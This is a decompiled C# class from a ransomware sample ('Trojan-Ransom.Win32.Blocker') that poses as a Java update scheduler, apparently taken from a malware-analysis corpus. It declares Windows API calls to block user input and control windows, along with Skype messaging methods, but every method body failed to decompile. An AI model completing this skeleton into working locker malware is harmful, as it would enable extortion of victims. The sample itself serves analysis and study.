// Decompiled with JetBrains decompiler
// Type: jusched.SkypeSP
// Assembly: Java(TM) Update Scheduler, Version=7.8.23.8, Culture=neutral, PublicKeyToken=null
// MVID: 54422980-21B4-4F02-866B-2C0284A5709C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.pay-cb14610d9737dfe6f8672c39419bfd112bcb8aefbdfd7b8ffad486b64e852a23.exe

using System;
using System.Runtime.InteropServices;
using System.Timers;

namespace jusched
{
  public class SkypeSP
  {
    private const int SW_SHOWNORMAL = 1;
    private const int SW_MINIMIZE = 6;
    private const bool LOCKED = true;
    private const bool UNLOCKED = false;
    public static string pais;
    public static Timer aTimer;

    static SkypeSP()
    {
      // ISSUE: unable to decompile the method.
    }

    public SkypeSP()
    {
      // ISSUE: unable to decompile the method.
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool ShowWindow(IntPtr _param0, int _param1);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern long SetForegroundWindow(long _param0);

    [DllImport("user32.dll")]
    private static extern IntPtr FindWindow(string _param0, string _param1);

    [DllImport("User32.dll")]
    private static extern IntPtr FindWindowEx(
      IntPtr _param0,
      IntPtr _param1,
      string _param2,
      string _param3);

    [DllImport("User32.dll")]
    private static extern IntPtr SetFocus(IntPtr _param0);

    [DllImport("User32.dll")]
    private static extern bool BlockInput(bool _param0);

    public static void skype_0()
    {
      // ISSUE: unable to decompile the method.
    }

    public static void NICE()
    {
      // ISSUE: unable to decompile the method.
    }

    public static void check()
    {
      // ISSUE: unable to decompile the method.
    }

    private static void skype_attach()
    {
      // ISSUE: unable to decompile the method.
    }

    private static void skype_cc()
    {
      // ISSUE: unable to decompile the method.
    }

    private static void skype_msg()
    {
      // ISSUE: unable to decompile the method.
    }

    private static object rand_msg()
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
